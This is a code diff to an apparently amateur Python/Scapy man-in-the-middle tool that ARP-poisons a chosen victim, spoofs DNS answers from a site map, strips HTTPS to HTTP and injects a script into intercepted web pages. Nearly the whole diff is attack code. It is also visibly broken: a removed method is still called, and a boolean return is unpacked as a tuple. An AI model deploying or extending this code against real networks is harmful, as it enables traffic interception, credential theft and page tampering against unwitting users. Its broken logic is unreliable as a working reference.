@@ -1,5 +1,7 @@
 from scapy.all import *
 from scapy.all import ARP, DNS, Ether, IP, UDP, DNS, DNSQR, DNSRR, TCP
+load_layer('tls')
+load_layer('http')
 #from scapy.all import Ether, ARP, get_if_addr, conf, sendp
 import argparse
 from time import sleep
@@ -47,8 +49,8 @@ elif sys.version_info[0] < 3:
     input = raw_input
 
 
-print("""Testing SSL stripping, ARPPV1.0.4.py is different from ARPPV1.0.3.py in the sense that this version might break, 
-      if you want to use the stable code with DNS spoofing use ARPPV1.0.3.py or ARPPV1.0.2.py""")
+# print("""Testing SSL stripping, ARPPV1.0.4.py is different from ARPPV1.0.3.py in the sense that this version might break, 
+#   if you want to use the stable code with DNS spoofing use ARPPV1.0.3.py or ARPPV1.0.2.py""")
 class ARPP(object):
     def __init__(self):
         """The __init__ defines some attributes of the class helping with: 
@@ -467,10 +469,11 @@ class ARPP(object):
             ipVictim (str, optional): The IP of the victim that you want to DNS spoof. Defaults to "".
         """
         # a dictionary of sites that if the victim tries to access them they are directed to the wrong IP address
+        # we read this from the file target_sites_DNS.conf
         target_sites_map = {}
         with open("target_sites_DNS.conf", "r") as f:
             for line in f.readlines():
-                if not line.startswith("#"):   
+                if not line.startswith("#"):   # ignore comments in file
                     splitline = line.split("|")
                     site, site_map = splitline[0].strip().encode(), splitline[1].strip()
                     target_sites_map[site]=site_map
@@ -530,11 +533,11 @@ class ARPP(object):
             pass
         
         # start the SSL stripping
-        self.SSLstrip()
+        self.SSLstrip(ipVictim=answer)
     
-    def SSLstrip(self):
+    def SSLstrip(self, ipVictim):
         # Create packet_callback from SSL stripping class
-        SSLS = SSLstripping(selected_interface=self.SELECTED_INTERFACE)
+        SSLS = SSLstripping(selected_interface=self.SELECTED_INTERFACE, ipVictim=ipVictim)
         def packet_callback(packet):
             return SSLS.handle_packet(packet)
         
@@ -626,13 +629,13 @@ class DNSPacketHandler(object):
         
     
     def forward_dns(self, dns_packet):
-        """_summary_
+        """Forward packet when DNS spoofing not needed
 
         Args:
-            dns_packet (_type_): _description_
+            dns_packet : packet that is DNS query
 
         Returns:
-            _type_: _description_
+            str: Information
         """
         print("Forwarding: {}".format(dns_packet[DNSQR].qname))
         response = sr1(IP(dst='8.8.8.8')/
@@ -676,7 +679,7 @@ class DNSPacketHandler(object):
         sendp(packet, iface=self.SELECTED_INTERFACE, verbose=0)
 
     def send_response(self, packet, target_sites_map):
-        """_summary_
+        """This method crafts the fake DNS replies
 
         Args:
             packet (_type_): _description_
@@ -733,63 +736,10 @@ class SSLstripping(object):
     Args:
         object (_type_): _description_
     """
-    def __init__(self, selected_interface):
+    def __init__(self, selected_interface, ipVictim):
         self.SELECTED_INTERFACE = selected_interface
         self.initial_http = True
-    
-    # def modify_request(self, packet):
-    #     # Retrieve the HTTP request layer
-    #     request = packet[http.HTTPRequest]
-        
-    #     # Replace "https://" with "http://" in the Host field
-    #     request.Host = request.Host.replace("https://", "http://")
-        
-    #     # Delete checksum and length fields, will be recalculated by Scapy
-    #     del request.chksum
-    #     del packet[IP].len
-    #     del packet[TCP].chksum
-        
-    #     # Update the packet's raw payload with the modified request
-    #     packet[Raw].load = str(request)
-        
-    #     return packet
-    
-    def sslstrip_packet(self, packet):
-        if TCP in packet and Raw in packet:
-            raw_payload = packet[Raw].load
-
-            # Check if it's an HTTPS request
-            if b"CONNECT" in raw_payload:
-                print("Connect in payload")
-                # Modify the request to target the destination HTTP server
-                modified_payload = raw_payload.replace(b"CONNECT", b"GET")
-                packet[Raw].load = modified_payload
-
-                # Remove the TLS layer from the packet
-                del packet[TCP].payload
-
-                # Recalculate IP and TCP checksums
-                del packet[IP].len
-                del packet[IP].chksum
-                del packet[TCP].chksum
-
-        return packet
-        # if response[TCP].dport == 80: 
-        #     # if the response is already http we don't need to do anything
-        #     pass
-        # elif response[TCP].dport==443:
-        #     # if the response if https
-        #     del response[TCP].dport
-        #     response[TCP].dport = 80
-        #     response[Raw].load = response[Raw].load.replace("https", "http")
-        #     response[Raw].load = response[Raw].load.replace("HTTPS", "HTTP")
-        
-        #     # Delete checksum and length fields, will be recalculated by Scapy
-        #     del response.chksum
-        #     del response[IP].len
-        #     del response[TCP].chksum
-            
-        # return response
+        self.ipVictim = ipVictim
 
     def modify_content(self, packet):
         if Raw in packet:
@@ -798,92 +748,50 @@ class SSLstripping(object):
 
             # Modify the content of the web page (e.g., injecting scripts)
             modified_payload = raw_payload.replace("</body>", "<script> alert('XSS')</script></body>")
+            modified_payload = modified_payload.replace("https", "http")
             packet[Raw].load = modified_payload
 
             # Recalculate TCP checksum
             del packet[TCP].chksum
 
         return packet
-    
-    
-        # if Raw in response:
-        #     # Retrieve the raw payload of the packet
-        #     raw = response[Raw]
-            
-        #     # Modify the content of the web page (e.g., injecting scripts)
-        #     raw.load = raw.load.replace("</body>", "<script>alert('XSS')</script></body>")
-            
-        #     # Recalculate checksums and lengths
-        #     del response[IP].len
-        #     del response[TCP].chksum
-            
-        # return response
 
-    def forward_packet(self, packet):
-        """Forwarding of arbitrary packets
-
-        Args:
-            packet (Scapy packet): _description_
-        """
-        sendp(packet, iface=self.SELECTED_INTERFACE, verbose=0)
-
-
-    def handle_packet(self, packet):
-        # global initial_http
-        # global sslstrip
-        if TCP in packet:
-            print("got packet from {}".format(packet[IP].src))
-
+    def has_TLS(self, packet):
         if TCP in packet and Raw in packet:
-            raw_payload = packet[Raw].load
-
-            if b"GET" in raw_payload:
-                print("GET in payload")
-                # Step 2: Initial HTTP Connection
-                if self.initial_http:
-                    print("Modifying payload...")
-                    packet = self.modify_content(packet)
-                    send(packet, iface=self.SELECTED_INTERFACE)
-                    self.initial_http = False
-                else:
-                    print("Sending response")
-                    # Subsequent HTTP requests
-                    response = sr1(packet)
-
-                    if response and TCP in response:
-                        # Step 4: SSL Stripping
-                        response = self.sslstrip_packet(response)
-
-                        # Step 5: Content Modification
-                        response = self.modify_content(response)
-
-                        # Send the modified response to the user's browser
-                        send(response, iface=self.SELECTED_INTERFACE)
-        else:
-            pass
+            payload = packet[TCP].load
+            if payload.startswith(b'\x16\x03'): # signifies TLS
+                return True
+        return False
     
-    # def handle_packet(self, packet):
-    #     # server -> me : sport = http(s)
-    #     # me -> server : dport = http(s)
-        
-    #     if TCP in packet:
-    #         if packet[TCP].dport in [80,443]:    # if we have an HTTP(S) request
-    #             # send packet and get response
-    #             response = sr1(packet, iface=self.SELECTED_INTERFACE)
+    def handle_packet(self, packet):
+        # server -> me : sport = http(s)
+        # me -> server : dport = http(s)
+        if TCP in packet and Raw in packet:
+            if packet[IP].src == self.ipVictim:
+                print("got packet from {}".format(self.ipVictim))
                 
-    #             # if the response is https then we turn it into http
-    #             if response and response[TCP].sport==443:
-    #                 # Step 4: HTTPS to HTTP Conversion
-    #                 response = self.modify_response_to_http(response)
+                response = sr1(packet, iface=self.SELECTED_INTERFACE)
+            
+                if response and TCP in response:
+                    # turn sport to 80
+                    if response[TCP].sport == 443:
+                        del response[TCP].sport
+                        response[TCP].sport = 80
                     
-    #                 # Step 5: Content Modification
-    #                 response = self.modify_content(response)
+                    #delete TLS payload if present
+                    tls_in_packet, payload = self.has_TLS(response)
+                    if tls_in_packet:
+                        del response[TCP].load
+                        response[TLSClientHello].cipher = [0]
+                       
                     
-    #                 # Send the modified response to the user's browser
-    #                 sendp(response, iface=self.SELECTED_INTERFACE)
-    #         else:
-    #             self.forward_packet(packet)
-    
+                    # stripping of SSL
+                    response = self.sslstrip_packet(response)
+                    
+                    # js injection
+                    response = self.modify_content(response)
+                    
+                    send(response, iface=self.SELECTED_INTERFACE)    
 
 def main():
     # create the class and start the command line interface
